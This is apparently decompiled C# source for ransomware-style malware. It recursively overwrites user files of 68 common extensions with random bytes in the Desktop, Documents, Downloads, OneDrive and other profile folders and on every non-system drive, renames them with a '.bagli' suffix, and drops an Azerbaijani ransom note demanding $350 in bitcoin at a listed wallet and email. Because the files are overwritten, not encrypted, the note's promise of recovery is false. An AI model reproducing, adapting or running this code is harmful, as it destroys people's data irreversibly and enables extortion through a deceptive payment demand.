using System;
using System.IO;
using System.Linq;

namespace ns0;

internal sealed class Class0
{
	public string string_0 = Environment.UserName;

	public string string_1 = "C:\\Users\\";

	public string[] string_2 = new string[9] { "Komputerinizdəki fayllar şifrələndi.", "Faylların bərpası üçün təqdim olunan bitkoin adresinə bitkoin göndərməyiniz xahiş olunur.", "Bərpa etmək üçün məbləği aşağıda göstərilmiş ünvana göndərin. Göndərdikdən sonra email vasitəsi ilə əlaqə saxlayın.", "Ödənməmişdən əvvəl yazılan heç bir mail üçün cavab yazılmayacaq. Ödəniş yalnız bitcoin ilə mümükündür.", "Narahat olmayın ödənişdən sonra sizə şifrə və proqram veriləcəkdir və sizin fayllar qayıdacaqdır.", "Ödəniş qiyməti:350$", "Bitcoin address: bc1qnurh904jcnxm0amfg2cy3406k4ed2vd2x67s8p", "Email: ramil.namazov.1992@outlook.com", "ID: 740682679" };

	private static Random random_0;

	internal string[] string_3 = new string[68]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".PDF", ".php",
		".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll", ".XLSX", ".cs",
		".mp3", ".mp4", ".DOCX", ".dwg", ".DOC", ".zip", ".rar", ".mov", ".rtf", ".bmp",
		".mkv", ".avi", ".apk", ".lnk", ".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab",
		".gzip", ".lzh", ".tar", ".jpeg", ".xz", ".JPG", ".PNG", ".mpeg", ".mp3", ".mpg",
		".core", ".XLS", ".pdb", ".ico", ".pas", ".db", ".wmv", ".MP4"
	};

	static Class0()
	{
		random_0 = new Random();
	}

	public static byte[] smethod_0(int int_0)
	{
		int_0++;
		byte[] array = new byte[int_0];
		random_0.NextBytes(array);
		return array;
	}

	public void method_0(string string_4)
	{
		try
		{
			string[] files = Directory.GetFiles(string_4);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (string_3.Contains(extension) && fileName != "oxu.txt")
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						if (fileInfo.Length < 1098576L)
						{
							File.WriteAllBytes(files[i], smethod_0(Convert.ToInt32(fileInfo.Length)));
							File.Move(files[i], files[i] + ".bagli");
						}
						else
						{
							File.WriteAllBytes(files[i], smethod_0(Convert.ToInt32(1098576)));
							File.Move(files[i], files[i] + ".bagli");
						}
						if (flag)
						{
							flag = false;
							File.WriteAllLines(string_4 + "/oxu.txt", string_2);
						}
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(string_4);
			for (int i = 0; i < directories.Length; i++)
			{
				method_0(directories[i]);
			}
		}
		catch (Exception)
		{
		}
	}

	public void method_1()
	{
		string string_ = string_1 + string_0 + "\\Desktop";
		string string_2 = string_1 + string_0 + "\\Links";
		string string_3 = string_1 + string_0 + "\\Contacts";
		string string_4 = string_1 + string_0 + "\\Desktop";
		string string_5 = string_1 + string_0 + "\\Documents";
		string string_6 = string_1 + string_0 + "\\Downloads";
		string string_7 = string_1 + string_0 + "\\Pictures";
		string string_8 = string_1 + string_0 + "\\Music";
		string string_9 = string_1 + string_0 + "\\OneDrive";
		string string_10 = string_1 + string_0 + "\\Saved Games";
		string string_11 = string_1 + string_0 + "\\Favorites";
		string string_12 = string_1 + string_0 + "\\Searches";
		string string_13 = string_1 + string_0 + "\\Videos";
		method_0(string_);
		method_0(string_2);
		method_0(string_3);
		method_0(string_4);
		method_0(string_5);
		method_0(string_6);
		method_0(string_7);
		method_0(string_8);
		method_0(string_9);
		method_0(string_10);
		method_0(string_11);
		method_0(string_12);
		method_0(string_13);
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				method_0(driveInfo.ToString());
			}
		}
	}
}
